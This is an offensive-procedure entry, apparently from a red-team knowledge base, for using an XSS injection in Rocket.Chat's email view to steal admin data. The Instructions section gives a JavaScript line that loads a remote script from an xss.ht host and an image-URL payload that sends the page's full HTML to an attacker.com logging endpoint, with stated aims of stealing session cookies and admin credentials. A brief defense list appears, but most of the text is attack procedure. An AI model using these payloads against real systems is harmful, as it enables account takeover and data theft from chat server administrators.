---
id: proc-rocket-chat-xss-exfil-3
name: Execute-XSS-to-Exfiltrate-Admin-DOM-and-Session-Data
tags:
  - xss
  - exfiltration
  - dom-theft
type: procedure
tools:
  - '[[tools/xss-ht]]'
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Android
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Archive via Custom Method]]'
updated_at: '2025-12-14T00:11:09.139Z'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Archive via Custom Method]]'
---
# Execute-XSS-to-Exfiltrate-Admin-DOM-and-Session-Data

## Summary

This procedure executes the injected JavaScript to load external scripts, capture the DOM of the email view (including session-related elements), and exfiltrate data to the attacker's server.

## Description

The base64 JS appends multiple <script> tags from xss.ht, which then create hidden iframes to scrape the WebView DOM (meta viewport, styles, email content, and any session cookies). Data is sent via img src or fetch to the attacker's endpoint, enabling theft of admin credentials or further device compromise.

## Requirements

1. Payload execution confirmed from prior step
2. External server (xss.ht) configured to receive and log exfiltrated data
3. Knowledge of JS DOM manipulation

## Defense

Defensive measures and detection strategies:

- Implement network monitoring for outbound requests from apps to unknown domains
- Use app sandboxing to limit WebView access to sensitive data
- Enable certificate pinning to block unauthorized exfil

## Objectives

1. Load and run arbitrary JS in admin context
2. Collect DOM and session artifacts
3. Transmit data stealthily to attacker

## Instructions

### Step 1: Append External Scripts

**Context**: Decoded JS creates and appends script elements sourcing malicious code.

The JS executes: `var a=document.createElement("script");a.src="https://2973956338.xss.ht";document.body.appendChild(a);`

### Step 2: Capture and Exfiltrate DOM

**Context**: External scripts use document.querySelectorAll to grab elements, serialize to JSON, and send via hidden img or XMLHttpRequest.

Example exfil: Create img with src=`https://attacker.com/log?data=${encodeURIComponent(document.documentElement.outerHTML)}`

**Expected Output**: Data received on attacker's server, including admin email content and potential session info.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Archive via Custom Method]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/xss-ht]]

## Tags

- [[Exfiltration]]
- [[dom-theft]]
